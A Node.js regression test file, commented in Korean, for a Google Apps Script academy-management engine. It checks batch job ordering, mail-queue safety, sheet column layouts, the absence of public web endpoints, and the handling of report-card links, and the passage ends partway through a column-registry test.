const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { execFileSync } = require('node:child_process');

const ROOT = path.resolve(__dirname, '..');
const { ENGINE_FILES, engineSource, liveFiles, sharedBlocks } = require('./_engine-source');
/* 주석 제거 통로는 공용 하나다 — `tests/lib/소스검사.js` (F401 계열 · 대기열 P3 줄73). */
const { 코드만 } = require('./lib/소스검사.js');
const MANIFEST_PATH = path.join(ROOT, 'appsscript.json');
const code = engineSource(); // 엔진 전체를 한 문자열로 — 파일이 쪼개져도 아래 표식 검사가 그대로 산다
/* 🔑 **부정 단언 전용** 정제본 — 「없어야 한다」를 원문에 대고 재면 누군가 그 문구를 주석에 적는 순간
 *   가드가 엉뚱하게 빨개진다(대기열 P3 #Q72 · F401 계열). 감싸는 것은 **부정 단언의 주어뿐**이다:
 *   긍정 단언과 `section()` 앵커는 원문 `code` 를 그대로 본다 — 앵커 다수가 주석 배너라
 *   정제본에서 사라지고, 그러면 20건이 적색이 아니라 **미실행**으로 샌다(⑤회차 실측).
 *   대가: 엔진 1.28MB 를 한 번 렉싱한다(≈0.6초 · 모듈 적재 시 1회). 자리마다 감싸면 15회다. */
const 코드정제 = 코드만(code);

function section(startMarker, endMarker) {
  const start = code.indexOf(startMarker);
  assert.notEqual(start, -1, `시작 표식을 찾지 못함: ${startMarker}`);
  const end = code.indexOf(endMarker, start + startMarker.length);
  assert.notEqual(end, -1, `끝 표식을 찾지 못함: ${endMarker}`);
  return code.slice(start, end);
}

function assertOrder(text, markers) {
  let previous = -1;
  markers.forEach((marker) => {
    const current = text.indexOf(marker);
    assert.notEqual(current, -1, `순서 검사 표식을 찾지 못함: ${marker}`);
    assert.ok(current > previous, `실행 순서가 잘못됨: ${markers.join(' → ')}`);
    previous = current;
  });
}

/* [v9.99] 조 편성·발화 상수 실값 로드 — 테스트가 상수를 하드코딩하면 정본이 바뀔 때 검사만 조용히 낡는다.
 *   상수 블록(GROUP_COUNT ~ PAIR_PATTERNS)을 잘라 그대로 평가해 실제 값을 쓴다. */
function groupConsts() {
  const s = code.indexOf('const GROUP_COUNT = 4;');
  assert.notEqual(s, -1, '조 편성 상수 블록을 찾지 못함');
  // [v9.135] 끝 표식을 주석 문구에서 코드 심볼로 교체 — 문구 앵커는 그 문구를 다듬는 순간 가드가 죽는다(worktree-version-collision 교훈 재발 방지). 사이의 주석은 평가해도 무해.
  const e = code.indexOf('function seasonStartOf_', s);
  assert.notEqual(e, -1, '조 편성 상수 블록 끝 표식(seasonStartOf_)을 찾지 못함');
  return new Function(`${code.slice(s, e)}
    return { GROUP_COUNT, ROLE_NAMES, ROLE_ICONS, ROLE_TALK, ROLE_DUTY, SEASON_WEEKS,
             TALK_PLAN_MIN, TALK_ROUNDS, FOCUS_START_WEEK, PAIR_PATTERNS };`)();
}

function loadFunction(startMarker, endMarker, functionName, dependencies) {
  const source = section(startMarker, endMarker);
  const names = Object.keys(dependencies);
  const values = names.map((name) => dependencies[name]);
  return new Function(...names, `${source}\nreturn ${functionName};`)(...values);
}

test('라이브 탑재 .js 전수의 구문이 정상이다 (.claspignore 파생 — 엔진 7종만 보던 옛 분모는 G8 의 구멍)', () => {
  // 파일별로 검사한다 — 합친 문자열로 검사하면 어느 파일이 깨졌는지 못 가리킨다.
  const 전수 = liveFiles();
  assert.ok(전수.length >= ENGINE_FILES.length + 3,
    '라이브 파일 파생이 엔진 7종보다 얇다(' + 전수.join(',') + ') — .claspignore 파싱이 깨졌으면 분모가 조용히 준다');
  ENGINE_FILES.forEach((f) => assert.ok(전수.includes(f), 'ENGINE_FILES 의 ' + f + ' 가 라이브 파생에 없다 — .claspignore 와 어긋났다'));
  전수.forEach((f) => {
    execFileSync(process.execPath, ['--check', path.join(ROOT, f)], { stdio: 'pipe' });
  });
});

test('Apps Script 설정 파일이 정상이며 실행 API는 본인만 허용한다', () => {
  const manifest = JSON.parse(fs.readFileSync(MANIFEST_PATH, 'utf8'));
  assert.equal(manifest.runtimeVersion, 'V8');
  assert.equal(manifest.executionApi && manifest.executionApi.access, 'MYSELF');
});

test('야간 작업은 Glide 포인트 빈칸 보정 뒤에 숙제 전개와 중복 정정을 실행한다', () => {
  const body = section('function nightJobs()', 'function dailyBackupJob()');
  assertOrder(body, [
    "safeRun('calcAll', calcAll)",
    "safeRun('expandHwBatch', expandHwBatch)",
    "safeRun('dailyGuard', dailyGuard)"
  ]);
});

test('아침 운영 알림은 메일 발송 성공 뒤에만 대기열을 지운다', () => {
  const body = section('function sendMorningDigest()', 'function teacherEmailMap_');
  assertOrder(body, [
    "MailApp.sendEmail(ADMIN_EMAIL, '[SYNK] ☀️ 오늘의 운영 브리핑'",
    "p.deleteProperty('브리핑큐')"
  ]);
});

test('아침 운영 알림은 쿼터 부족·발송 실패 때 대기열을 보존한다', () => {
  const makeDigest = ({ quota, mailFails }) => {
    const events = [];
    let queue = '대기 중인 운영 알림';
    const props = {
      getProperty: () => queue,
      setProperty: (key, value) => { queue = value; events.push('set'); },
      deleteProperty: () => { queue = ''; events.push('delete'); }
    };
    const lock = {
      waitLock: () => { events.push('lock'); },
      releaseLock: () => { events.push('unlock'); }
    };
    const sendMorningDigest = loadFunction(
      'function sendMorningDigest()',
      'function teacherEmailMap_',
      'sendMorningDigest',
      {
        PropertiesService: { getScriptProperties: () => props },
        LockService: { getScriptLock: () => lock },
        quotaOk: () => quota,
        MailApp: {
          sendEmail: () => {
            events.push('mail');
            if (mailFails) throw new Error('메일 실패');
          }
        },
        ADMIN_EMAIL: 'admin@example.com'
      }
    );
    return { sendMorningDigest, events, getQueue: () => queue };
  };

  const noQuota = makeDigest({ quota: false, mailFails: false });
  noQuota.sendMorningDigest();
  assert.deepEqual(noQuota.events, ['lock', 'unlock']);
  assert.equal(noQuota.getQueue(), '대기 중인 운영 알림');

  const failure = makeDigest({ quota: true, mailFails: true });
  assert.throws(() => failure.sendMorningDigest(), /메일 실패/);
  assert.deepEqual(failure.events, ['lock', 'mail', 'unlock']);
  assert.equal(failure.getQueue(), '대기 중인 운영 알림');

  const success = makeDigest({ quota: true, mailFails: false });
  success.sendMorningDigest();
  assert.deepEqual(success.events, ['lock', 'mail', 'delete', 'unlock']);
  assert.equal(success.getQueue(), '');
});

test('메일 발송 중 큐가 늘어나면 발송한 앞부분만 제거하고 새 알림은 보존한다', () => {
  const original = '기존 알림\n';
  const added = '발송 중 추가된 알림\n';
  let queue = original;
  const events = [];
  const props = {
    getProperty: () => queue,
    setProperty: (key, value) => { queue = value; events.push('set'); },
    deleteProperty: () => { queue = ''; events.push('delete'); }
  };
  const sendMorningDigest = loadFunction(
    'function sendMorningDigest()',
    'function teacherEmailMap_',
    'sendMorningDigest',
    {
      PropertiesService: { getScriptProperties: () => props },
      LockService: { getScriptLock: () => ({ waitLock: () => {}, releaseLock: () => {} }) },
      quotaOk: () => true,
      MailApp: { sendEmail: () => { queue += added; events.push('mail'); } },
      ADMIN_EMAIL: 'admin@example.com'
    }
  );

  sendMorningDigest();
  assert.equal(queue, added);
  assert.deepEqual(events, ['mail', 'set']);
});

test('브리핑 생산과 발송은 같은 종류의 ScriptLock으로 큐를 보호한다', () => {
  const producer = section('function adminMail(', 'function sendMorningDigest()');
  const sender = section('function sendMorningDigest()', 'function teacherEmailMap_');
  assert.ok(producer.includes('LockService.getScriptLock()'));
  assert.ok(sender.includes('LockService.getScriptLock()'));
  assert.ok(producer.includes('finally { lock.releaseLock(); }'));
  assert.ok(sender.includes('finally { lock.releaseLock(); }'));
});

test('공개 웹 실행 함수가 새로 생기지 않았다', () => {
  assert.equal(/^function\s+do(?:Get|Post)\s*\(/m.test(코드정제), false);
});

test('재건용 핵심 시트 제목이 실제 읽기·쓰기 순서와 일치한다', () => {
  // [v9.37] skeleton 배열이 모듈 정본으로 승격 → [v9.135] 지연 평가 함수 sheetSkeleton_()로 전환(의도 동일: 골격 헤더 정합)
  const body = section('function sheetSkeleton_()', 'function safeRun');
  assert.ok(body.includes(
    "['profiles', ['user_id','이름','이름_몽골','role','class_name','생일','email','연락처','messenger_link','parent_of','tuition','등록일','보호자명','보호자연락처','created_at']]"
  ));
  assert.ok(body.includes("['teacher_checkins', ['이름','구분','시각']]"));
});

test('재건 결과는 일부 단계가 실패하면 완료라고 표시하지 않는다', () => {
  const body = section('function bootstrapSynk()', 'function safeRun');
  assert.ok(body.includes("const rebuildFailed = log.some(line => line.indexOf('✗') === 0)"));
  assert.ok(body.includes("rebuildFailed ? 'SYNK OS 재건 일부 실패' : 'SYNK OS 재건 완료'"));
  assert.equal(코드만(body).includes("['기준 테이블', setupTables]"), false);
});

test('숙제 일괄 전개는 지급에 성공한 뒤에만 전개완료로 표시한다', () => {
  const body = section('function expandHwBatch()', 'function parentWeeklyDigest');
  // appendPoints(지급)가 '전개완료' 마킹보다 먼저 와야 미지급(선마킹 후 크래시)을 막는다.
  // 재시도 시 doneToday(point_logs 재조회)가 이미 지급된 학생을 걸러 중복 지급도 막는다.
  assertOrder(body, [
    'const doneIdx = []',
    'appendPoints(ss, outRows)',
    "doneIdx.forEach(i => hb.getRange(i + 2, 6).setValue('전개완료'))"
  ]);
});

test('월간 아카이브는 태그(H열)까지 8열로 이관·정리한다', () => {
  const body = section('function archiveMonthly()', 'function pruneAppState');
  assert.ok(body.includes("['log_id','student_id','points','reason','given_by','created_at','연월','태그']"));
  assert.ok(body.includes('plLast - 1, 8).getValues()'));
  assert.ok(body.includes('move.length, 8).setValues(move)'));
  assert.ok(body.includes('data.length, 8).clearContent()'));
  assert.ok(body.includes('keep.length, 8).setValues(keep)'));
  // 7열만 다루던 옛 패턴이 남으면 태그가 유실되거나 다음 행에 밀려붙는다
  assert.equal(/, 7\)\.(getValues|setValues|clearContent)/.test(코드만(body)), false);
});

test('성장 리포트 메일은 공개 URL 링크 대신 PNG를 첨부로 보낸다', () => {
  const body = section('function runReportCards_()', 'function exportSlidePng');
  assert.ok(body.includes('blob: blob.copyBlob()'));
  assert.ok(body.includes('{ attachments: [m.blob] }'));
  // 공개 URL(m.url)을 메일 본문에 실으면 미성년 실명·성적이 전달·캡처로 샌다
  assert.equal(코드만(body).includes("'리포트 카드 보기: ' + m.url"), false);
});

test.todo('숙제 일괄 지급을 별도 처리로그와 전용 잠금으로 원자화');
test.todo('숙제 포인트와 자동 정정을 같은 야간 계산에 즉시 반영');
/* [v9.138·부분 해소 → v9.139 현행화] 이 todo는 절반이 낡았다. 리포트카드 세션 요청으로 정정한다.
 *   ✅ 프리뷰(previewOneReportCard) — 공개 공유 제거·소유자 인증 링크로 교체 완료.
 *      회귀는 tests/리포트카드공개.test.js(⚠삭제됨 e75fc7fc 2026-08-19 — 지금 없다) 가 **실행 결과로** 잡았다(문자열이 아니라 setSharing 호출을 관찰) — 그것이 걷혀, 지금 이 자리를 재는 기계는 없다.
 *   ⏳ 배치(runReportCards_)의 공개 공유는 **의도적 존치** — report_cards.image_url을 Glide 학부모
 *      「성장 리포트」 탭이 읽고, SEND_REPORT_EMAIL=false라 지금은 그 탭이 카드가 학부모에게 닿는 유일한 통로다.
 *      끄면 화면이 빈다. 즉 남은 일은 "링크를 감추는 것"이 아니라 **Glide 배선을 인증 경로로 바꾸는 것**이다. */
test.todo('성장 리포트 배치(runReportCards_)의 Glide 배선을 인증 경로로 — 프리뷰 쪽은 v9.138에서 해소됨');
test.todo('실제 포인트 사유·점수 목록 확인 후 허용 규칙 적용');
test.todo('레이드·월간 정산의 중간 실패 복구 구조 추가');

test('[v9.40] preflightGlide는 콘텐츠 부족분을 자동 복구하고 진단은 그 뒤에 한다', () => {
  const body = section('function preflightGlide()', 'function safeRun');
  assertOrder(body, [
    'sheetSkeleton_()',                // ① 시트 골격(월간 산출물 포함) 먼저
    'contentSetupOf_(tp)',             // ② 부족 유형 자동 설치
    'injectMongolianContents()',       // ③ 큐레이션 몽골어 재주입
    'calcAll()',                       // ④ 계산(콜드스타트 시딩 포함)
    '자동 복구 후에도 불일치'            // ⑤ 복구 후 재실측 진단(경고 문구)
  ]);
  // 파괴 호출 금지 — setupSchedule은 라이브 15반 커스텀을 리셋한다
  assert.equal(/setupSchedule\(\)/.test(코드만(body)), false);
});

test('[v9.40] 시트 골격에 월간 산출 4종이 있다(구 Glide 조립의 잔재 · league_pairs 는 09-03 리그 폐지 정리로 빠졌다)', () => {
  const body = section('function sheetSkeleton_()', 'function bootstrapSynk()');
  ['synk_stories', 'synk_cards', 'world_raid', 'academic_log'].forEach((name) => {
    assert.ok(body.includes(`['${name}',`), `SHEET_SKELETON에 ${name} 누락`);
  });
  // teacher_stats 구 3열 스키마가 되살아나면 calcTeacherStats 실사용 8열과 다시 어긋난다
  assert.equal(코드만(body).includes("['teacher','지급수','편중률']"), false);
});

test('[v9.40] 공지 헬퍼는 라이브 구 스키마(title_ko/body_ko)를 인식한다', () => {
  const noticeBody = section('function addNotice(', 'function replaceContentType');
  assert.ok(noticeBody.includes("'title_ko'"));
  assert.ok(noticeBody.includes("'body_ko'"));
  const trBody = section('function translateNotices_(', 'function langColOf_');
  assert.ok(trBody.includes("'title_ko'"));
  // [08-27] 구 「리그 정산이 notices 1~3열에 직접 쓰면…」 검사는 리그 폐지로 과녁이 사라졌다.
  //   월드 레이드 쪽 같은 규약은 아래 자기 시험이 재고, 여기서는 헬퍼 자체만 본다.
});

test('[v9.40] calcAll은 숙제·퀴즈·팁 키가 없으면 게이트를 기다리지 않고 즉시 게시한다', () => {
  const body = section('function calcAll()', 'function syncProfiles()');
  assert.ok(body.includes("getState(st, '오늘의퀴즈').row < 1 || getState(st, '오늘의팁').row < 1"));
  assert.ok(body.includes("getState(st, pair[0] + '숙제').row > 0"));
});

test('[08-27 유호 지시 A] 🚫 반 대항 리그가 되살아나지 않는다 — 통째 폐지', () => {
  // 유호 08-27 「랭킹 시스템은 전부 삭제해줘」 + 「A(리그 통째로 걷는다)」.
  // 근거 정본: docs/SYNK_철학.md §48(등수·평균 금지) · §177(학부모께 「반 평균도 아이 화면에 두지 않았다」).
  //   리그 승패 판정이 «반 1인 평균»이라 정본을 정면으로 어기고 있었다.
  ['function leagueSettle_', 'function leagueStoryDaily_', 'LEAGUE_ON', 'LEAGUE_DAILY_CAST', 'matchupByCls']
    .forEach(n => assert.ok(!코드정제.includes(n), '리그 조각 「' + n + '」이 되살아났다'));
  // 🔴 함수를 지우면 «호출부»도 같이 가야 한다 — 안 그러면 밤 배치가 ReferenceError 로 통째로 죽는다.
  assert.ok(!코드정제.includes("safeRun('leagueSettle'"), '리그 정산 배선이 남았다 — 함수가 없으니 밤 배치가 죽는다');
  assert.ok(!코드정제.includes("safeRun('leagueStoryDaily'"), '리그 중계 배선이 남았다 — 함수가 없으니 밤 배치가 죽는다');
  // 레이드는 «남는다» — 같이 하는 재미를 지지 않고 주는 쪽이다. 이 줄이 리그와 함께 걷히는 것을 막는다.
  assert.ok(code.includes("safeRun('raidFriday'") || code.includes('function raidFriday'), '레이드까지 함께 걷혔다');
});

test('[v9.47] 영상팩 메일은 SEND_SCENE_PACK 게이트 뒤에서만 발송된다(발간·공지는 게이트 밖)', () => {
  assert.ok(code.includes('const SEND_SCENE_PACK = false'));
  const sb = section('function buildMonthlyStorybook_()', 'const WORLD_HP_PER');
  assert.ok(sb.includes('SEND_SCENE_PACK && quotaOk(1)'));
  assertOrder(sb, [
    "setValues([[ym, issue, title, 1, '전문', fullBody, uniqBadges, '']])", // [v9.50] 단일본 발간(시트)은 게이트 앞
    'SEND_SCENE_PACK && quotaOk(1)',
    'addNotice(ss,' // 발간 공지는 게이트 밖(항상)
  ]);
});

test('[v9.50] 스토리북은 단일본 1행으로 발간된다(챕터 분할 발간 제거)', () => {
  const sb = section('function buildMonthlyStorybook_()', 'const WORLD_HP_PER');
  assert.ok(!코드만(sb).includes('rows.length, 8).setValues(rows)'), '구 13행 분할 발간 코드가 남아 있음');
  assert.ok(sb.includes('const fullBody = rows.map('), '전문 조립 코드 없음');
});

test('[v9.50] 일일 전투 리포트는 RAID_DAILY_STORY 게이트로 꺼져 있고 주간 결산은 유지된다', () => {
  assert.ok(code.includes('const RAID_DAILY_STORY = false'));
  const rs = section('function raidStoryDaily()', 'const pf');
  assert.ok(rs.includes('if (!RAID_DAILY_STORY) return'));
  const night = section('function nightJobs()', 'function dailyBackupJob()');
  assert.ok(night.includes("safeRun('raidSettle', raidFriday)")); // 금·일 결산은 게이트 무관
});

test('[v9.50] AI 스튜디오는 키 없으면 스킵하고 야간 완주 마커 앞에서 실행된다', () => {
  const night = section('function nightJobs()', 'function dailyBackupJob()');
  assertOrder(night, [
    "safeRun('aiFeedbackBatch', aiFeedbackBatch_)",
    "safeRun('aiStudioBatch', aiStudioBatch_)",
    "safeRun('sweepLevelTest', sweepLevelTest_)",
    "PropertiesService.getScriptProperties().setProperty('야간배치완료일'"
  ]);
  const studio = section('function aiStudioBatch_()', 'function welcomeStoryBatch_()');
  assert.ok(studio.includes("getProperty('CLAUDE_API_KEY')"));
  assert.ok(studio.includes('if (!apiKey) return'));
  assert.ok(studio.includes('AI_STUDIO_MAX_CALLS')); // 비용 상한 가드
});

test('[v9.50] 오늘의 한 문장은 운세 슬롯을 대체하되 폴백을 유지하고, 개인 퀴즈는 공유열을 오버라이드한다', () => {
  assert.ok(code.includes("aiD6 && aiD6.s ? '💡 ' + aiD6.s : '🔮 ' + hashPick_(FORTUNES"), 'H1 폴백 구조 없음');
  const shared = section('function writeSharedCols_', 'function syncProfiles()');
  assert.ok(shared.includes('pq ? pq.q : q[0]'), 'A1 퀴즈 오버라이드 없음');
  assert.ok(shared.includes('pq ? pq.a : q[1]'), 'A2 해설 오버라이드 없음');
});

test('[v9.50] 월간 배치에 AI 4종이 스토리북 뒤·경영 리포트 앞 순서로 편입됐다', () => {
  const mj = section('function monthlyJobs()', 'function runExecReportNow');
  assertOrder(mj, [
    "safeRun('buildMonthlyStorybook', buildMonthlyStorybook_)",
    "safeRun('aiMonthlyTitles', aiMonthlyTitles_)",
    "safeRun('futureLetter', futureLetterBatch_)",
    "safeRun('parentHighlights', parentHighlightsMail_)",
    "safeRun('snsDrafts', snsDrafts_)",
    "safeRun('buildExecReport', buildExecReport_)",
    "safeRun('archiveMonthly', archiveMonthly)"
  ]);
});

test('[v9.50] 웰컴 대기열은 syncProfiles가 쌓고 아침 배치가 발송하며, 편지·하이라이트는 월키 멱등이다', () => {
  assert.ok(code.includes("pW.setProperty('웰컴대기'"), '웰컴 대기열 등록 없음(syncProfiles)');
  assert.ok(code.indexOf("pW.setProperty('웰컴대기'") > code.indexOf('function syncProfiles()'), '웰컴 대기열 등록이 syncProfiles 밖에 있음');
  const morning = section('function morningJobs()', 'function nightJobs()');
  assert.ok(morning.includes("safeRun('welcomeStoryBatch', welcomeStoryBatch_)"));
  const letter = section('function futureLetterBatch_()', 'const HL_TPL');
  assert.ok(letter.includes("String(r[0]) === '편지'"), '편지 재발송 방지 원장 조회 없음');
  const hl = section('function parentHighlightsMail_()', 'function snsDrafts_()');
  assert.ok(hl.includes("getProperty('하이라이트발송월')"), '하이라이트 월키 멱등 없음');
  assert.ok(hl.includes('if (!scenes.length) return'), '데이터 없는 학생 발송 생략 가드 없음');
});

test('[v9.47·v9.51] 칭찬(+3P)은 일일 한도에 있고 태그는 사유 접미로 흐른다(태그 열 폐기)', () => {
  assert.ok(code.includes("'칭찬': 1"));
  const dig = 코드만(section('function parentWeeklyDigestCore_', 'function restoreDrill'));
  assert.ok(dig.includes("rs.indexOf('칭찬·') === 0")); // 크루의 눈 태그 = reason 접미('칭찬·집중력')
  /* 🔴 구 8열(라이브 H열 = 🔒 Row ID) 읽기가 되살아나면 Row ID가 태그로 샌다.
   *    옛 판은 이 자리에서 «주석 배너 한 줄»이 없는 것을 금지로 삼았는데, 그 글자는 엔진
   *    어디에도 없었다(실물은 이 구간 안 point_logs 읽기 줄에 달린 다른 문장이다). 그래서
   *    코드가 무엇을 하든 항상 통과했다 — **주석은 행동이 아니고, 회귀가 되살아나도 그
   *    주석을 다시 쓰지는 않는다.** 2026-08-14 실측으로 발각(대기열 #Q72).
   *    행동으로 잰다: 읽기가 «있어야 하고»(없으면 아래 열 수 검사가 공허참이다) «6열이어야 한다».
   *    `dig` 를 정제해 두는 이유 — 앞으로 이 구간에 「8열 금지」를 설명하는 주석이 달려도
   *    그것이 위반으로 잡히지 않게 한다(설명이 자세할수록 잘 걸리는 자리다). */
  assert.match(dig, /pl\.getRange\([\s\S]{0,80}?\.getValues\(\)/,
    'point_logs 읽기가 이 구간에서 사라졌다 — 아래 열 수 검사가 공허참이 된다');
  assert.equal(/pl\.getRange\([\s\S]{0,80}?,\s*8\)/.test(dig), false,
    '구 8열 읽기 부활 — H열(🔒 Row ID)이 크루의 눈 태그로 샌다');
  const dg = section('function dailyGuard()', 'function notifyDailyAwards');
  assert.ok(dg.includes("rs.split('·')[0]")); // 한도는 기본 사유('칭찬')로 판정 — 태그 4종이 각각 1회씩 뚫리지 않게
  // 데모 시드가 8열(Row ID 자리)을 침범하지 않는다
  const seed = section('function seedDemoData()', 'function seedConsultDemo');
  assert.ok(seed.includes('plRows.length, 7'));
  assert.ok(seed.includes("'칭찬·집중력'"));
});

test('[v9.47] 무거운 러너 3종은 시간 예산+자동 이어하기를 쓴다(6분 강제 종료 대책)', () => {
  assert.ok(code.includes('const RUN_BUDGET_MS'));
  const seed = section('function seedDemoData()', 'function seedConsultDemo');
  assert.ok(seed.includes("setState(st, '데모시드_체인', '0')"));
  assert.ok(seed.includes('runSeedChain_(ss, st, tz, L, t0, 0)'));
  const chain = section('function runSeedChain_(', 'function seedConsultDemo');
  assert.ok(chain.includes("scheduleContinue_('seedDemoData')"));
  const clr = section('function clearDemoData()', 'function bootstrapSynk()');
  assert.ok(clr.includes("scheduleContinue_('clearDemoData')"));
  assert.ok(clr.includes('sh.deleteRows(start + 2, len)')); // 연속 행 묶음 삭제(가속)
  const pre = section('function preflightGlide()', 'function safeRun');
  assert.ok(pre.includes("scheduleContinue_('preflightGlide')"));
  // 마커 없는 부분 시드도 회수 가능해야 한다(교착 해소)
  assert.ok(clr.includes('마커 없는 부분 시드 회수 모드'));
});

test('[v9.48] 공유값 서버화 — calcAll이 학업 계산 뒤에 공유열을 쓰고, 학생/학부모 분기가 있다', () => {
  const body = section('function calcAll()', 'function writeSharedCols_');
  // 순서: 자녀 학업추세(BW)가 갱신된 뒤에 학부모 행으로 복사돼야 한 텀 늦은 값이 안 실린다
  assertOrder(body, ['calcAcademic_(acadById, pfData)', 'writeSharedCols_(ss, pf, st)']);
  const fn = section('function writeSharedCols_(', 'const WORLD_HP_PER');
  assert.ok(fn.includes("role === 'student'"));
  assert.ok(fn.includes("role === 'parent'"));
  assert.ok(fn.includes("String(r[35] || '') === '주말' ? '주말의' : '오늘의'")); // 반유형 분기(구 Glide ITE)
  assert.ok(fn.includes('splitQuiz')); // 퀴즈 문제/정답 분해(구 Glide Split Text)
  assert.ok(fn.includes("String(r[9] || '').split(',')[0]")); // parent_of 첫 자녀(구 Relation)
  assert.ok(fn.includes('writeIfChanged(pf, 2, SHARED_COL_START, out.map(')); // 무변경 시 쓰기 0(쿼터 보호) — [v9.74] 블록 분리 쓰기
  // 헤더 20개가 열 지도와 일치해야 조립 문서의 CG~CZ 안내가 유효 ([v9.49] 폼URL 2종+새첨삭수 추가로 17→20)
  assert.ok(code.includes("const SHARED_COL_START = 85"));
  const heads = code.match(/const SHARED_COL_HEADERS = \[([\s\S]*?)\];/);
  assert.ok(heads, 'SHARED_COL_HEADERS 선언을 찾지 못함');
  assert.equal(heads[1].split(',').filter(s => s.trim()).length, 20);
  // [v9.74] 2차 블록(DH112~DN118) — 강사 행 분기 + 두 블록 분리 쓰기 + 길이 기계 가드
  assert.ok(fn.includes("role === 'teacher'"), '강사 행 분기(수업준비·출퇴근·폼URL)가 없다');
  assert.ok(code.includes('const SHARED2_COL_START = 112'), '2차 블록 시작(DH112) 상수가 없다');
  const heads2 = code.match(/const SHARED2_COL_HEADERS = \[([\s\S]*?)\];/);
  assert.ok(heads2, 'SHARED2_COL_HEADERS 선언을 찾지 못함');
  assert.equal(heads2[1].split(',').filter(s => s.trim()).length, 7);
  assert.ok(fn.includes('writeIfChanged(pf, 2, SHARED_COL_START,') && fn.includes('writeIfChanged(pf, 2, SHARED2_COL_START,'),
    '두 블록 분리 쓰기가 아니면 선점 구간(DA105~DG111)을 덮어쓴다');
  assert.ok(fn.includes('a.length !== HEADS_ALL.length'), '분기 반환 길이 기계 가드(리뷰 H1)가 없다 — 열 밀림 조용한 파괴 위험');
  // [v9.82] 3차 블록(DP120~DQ121) — DO119(랭킹보드, v9.81) 선점 회피 + 세 블록 분리 쓰기
  assert.ok(code.includes('const SHARED3_COL_START = 120'), '3차 블록 시작(DP120) 상수가 없다');
  const heads3 = code.match(/const SHARED3_COL_HEADERS = \[([\s\S]*?)\];/);
  assert.ok(heads3, 'SHARED3_COL_HEADERS 선언을 찾지 못함');
  assert.equal(heads3[1].split(',').filter(s => s.trim()).length, 4); // [v9.97] +결석폼URL(DR122) · [v9.138] +퀴즈폼URL(DS123)
  // [v9.138] 새 열은 **배열 끝에만** 붙는다 — 중간 삽입은 기존 열을 통째로 한 칸씩 밀어 Glide 바인딩을 조용히 어긋내고,
  //   그 파괴는 다음 calcAll이 값을 쓰는 순간까지 눈에 띄지 않는다(열 이름은 그대로인데 내용만 밀린다).
  assert.ok(/const SHARED3_COL_HEADERS = \['출퇴근HTML', '결석신고HTML', '결석폼URL', '퀴즈폼URL'\]/.test(code),
    '3차 블록 열 순서가 바뀌었다 — 기존 3열(DP·DQ·DR)의 자리는 불변이어야 한다');
  assert.ok(fn.includes('writeIfChanged(pf, 2, SHARED3_COL_START,'), '3차 블록 분리 쓰기가 아니면 선점 열 DO119(랭킹보드)를 덮어쓴다');
  assert.ok(fn.includes('.concat(SHARED3_COL_HEADERS)'), 'HEADS_ALL이 3차 블록을 포함하지 않는다 — 분기 반환 길이 가드가 무력화');
});

test('[v9.74] profiles 열 레지스트리 — 공유 블록이 선점 열(DA105 최애·DB~DD 교재연동 3열)과 겹치지 않는다', () => {
  // 리뷰 B1 재발 차단: 공유 블록을 확장할 때 이미 주인이 있는 열을 침범하면 첫 calcAll이 데이터를 파괴한다.
  /* [F080] 블록 목록을 손으로 적지 않는다 — 이 검사는 SHARED1~3만 알고 4차 블록은 검사 밖이었다(같은 파일의
   *   상담 디테일 검사는 알고 있었다 = 두 손 목록이 이미 갈라져 있었다). 이제 둘 다 sharedBlocks 하나에서 파생한다. */
  const blocks = sharedBlocks(code);
  assert.ok(blocks.length >= 4, '공유 블록 파생이 4개 미만 — 검사 대상이 사라졌다(파생기가 죽으면 이 검사는 조용히 통과한다)');
  // 파생기가 **하나도 빠뜨리지 않았는지**를 소스 쪽에서 되센다 — 헤더 상수 이름이 어긋난 블록은 조용히 검사 밖으로 나간다
  assert.equal(blocks.length, (code.match(/const SHARED\d*_COL_START = \d+/g) || []).length,
    'SHARED*_COL_START 개수와 파생된 블록 수가 다르다 — 헤더 상수를 못 찾은 블록이 검사 밖에 있다');
  const reserved = {
    105: '최애(v9.50·A4, 학생 Set Column)', 106: '목소리폼URL(교재연동)', 107: '목소리성장카드(교재연동)',
    108: '구연습노트_비움(09-04 폐지 · 열 예약만 유지 — 119 와 같은 꼴)', 119: '구랭킹보드_비움(08-27 순위표 폐지 · 열 예약만 유지)', 129: '오늘의만남(v9.99, calcAll 소그룹 3라운드 짝)',
    /* 🔴 아래 둘은 **코드가 만든 열이 아니다** — `langColOf_`가 이름으로 여는 열이라 자리는 라이브에서만 정해진다.
     *   08-04 라이브 실측에서 131·132에 앉아 있었고, 진로 4열을 131로 박았다가 그 위를 덮을 뻔했다(F080).
     *   레지스트리에 없으면 「비었다」로 읽히므로, 실측한 자리를 여기 적어 다음 블록이 못 밟게 한다. */
    131: '학교(langColOf_ — 코드가 여는 열이 아니다 · 08-04 라이브 실측)',
    132: '동네(langColOf_ — 코드가 여는 열이 아니다 · 08-04 라이브 실측)',
  };
  /* ⚠ 이 레지스트리는 **코드가 만드는 열만** 안다. 라이브 profiles 에는 코드가 모르는 열이 자란다 —
   *   Glide 가 심는 「🔒 Row ID」, langColOf_ 가 이름으로 만드는 「학교」·「동네」(조 편성).
   *   그래서 여기서 「비었다」고 읽은 번호가 라이브에선 이미 남의 것일 수 있다(08-04 라이브 실측:
   *   진로 4열을 131로 박았는데 그 자리에 학교·동네가 있었다). **새 블록은 번호를 박지 말고
   *   이름으로 찾아라**(profilesBlockAt_). 아래 검사가 그 규율을 지킨다. */
  Object.keys(reserved).forEach(cs => {
    const c = Number(cs);
    blocks.forEach(b => assert.ok(!(c >= b.start && c <= b.end),
      b.name + '(' + b.start + '~' + b.end + ')이 선점 열 ' + c + '(' + reserved[cs] + ')을 침범 — 리뷰 B1 재발'));
  });
  // 블록끼리도 겹치면 안 된다 — 새 블록의 시작을 잘못 세면 앞 블록의 꼬리를 덮는다(에러 없이 값만 밀린다)
  blocks.forEach((a, i) => blocks.slice(i + 1).forEach(b => assert.ok(a.end < b.start || b.end < a.start,
    a.name + '(' + a.start + '~' + a.end + ')과 ' + b.name + '(' + b.start + '~' + b.end + ')이 겹친다')));
  // 선점 주인들이 실제로 그 열을 쓰는지(레지스트리의 근거) — 코드가 바뀌면 이 목록도 갱신해야 한다
  assert.ok(code.includes("pf.getRange('DA1').getValue()) !== '최애'"), 'DA105 최애 보장 코드가 사라짐 — 레지스트리 갱신 필요');
  assert.ok(code.includes("pf.getRange('DO1').getValue()) !== '구랭킹보드_비움'"), 'DO119 열 예약 보장 코드가 사라짐 — 레지스트리 갱신 필요');
